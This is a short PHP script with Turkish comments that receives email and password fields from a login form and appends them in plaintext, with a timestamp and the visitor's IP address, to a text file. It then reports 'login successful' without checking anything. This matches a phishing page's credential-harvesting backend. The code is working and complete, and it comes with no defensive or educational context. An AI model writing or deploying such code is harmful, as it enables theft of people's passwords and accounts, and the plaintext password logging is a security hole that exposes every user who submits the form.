<?php
// Kullanıcıların giriş bilgilerini kaydetmek için dosya yolu
$log_file = 'login_logs.txt';

// POST isteği ile formdan gelen verileri alıyoruz
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Giriş tarihini ve zaman dilimini alıyoruz
    date_default_timezone_set('Europe/Istanbul'); // Zaman dilimini ayarla (İstanbul için örnek)
    $login_time = date('Y-m-d H:i:s'); // Tarih ve zaman dilimi formatı

    // Kullanıcının bilgilerini kaydetme işlemi
    $log_message = "E-Posta: $email - Şifre: $password - Giriş Zamanı: $login_time - IP: " . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
    
    // Dosyaya bilgileri ekleme
    file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

    // Başarılı giriş durumu
    echo "Giriş başarılı!";

    // Başka bir sayfaya yönlendirme yapılabilir veya işlem devam ettirilebilir.
}
?>
